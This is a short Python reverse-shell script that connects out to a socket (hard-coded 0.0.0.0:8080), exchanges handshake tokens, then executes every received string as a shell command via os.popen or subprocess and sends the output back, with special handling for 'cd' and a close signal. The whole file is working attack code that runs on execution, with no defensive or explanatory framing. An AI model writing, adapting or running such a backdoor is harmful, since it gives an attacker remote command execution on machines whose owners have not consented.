import os
import threading
import socket
import subprocess

def cmd(command):
    output = os.popen(command).read()
    if output == "":
        while True:
            exit_code = subprocess.call(command.split())
            if exit_code == 0:
                return str("BAM!")
            else:
                return str("UHHH")
    return output



def revshell_server():
    attserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    addr = ('0.0.0.0', 8080)
    attserver.connect(addr)
    start_signal = '<start>'
    attserver.sendall(start_signal.encode('utf-8'))
    while True:
        resp = attserver.recv(1024)
        if resp.decode('utf-8') == '<bravo>':
            attserver.send('<ready>'.encode('utf-8'))
            break
    while True:
        msg = attserver.recv(1024)
        if msg.decode('utf-8') == '<close>':
            attserver.close()
            break
        if msg.decode('utf-8')[0:3] == 'cd ':
            os.chdir(msg.decode('utf-8')[3:])
            attserver.sendall('Done'.encode('utf-8'))
            continue
        
        out_put = cmd(command=msg.decode('utf-8'))
        attserver.sendall(out_put.encode('utf-8'))
    


revshell_server()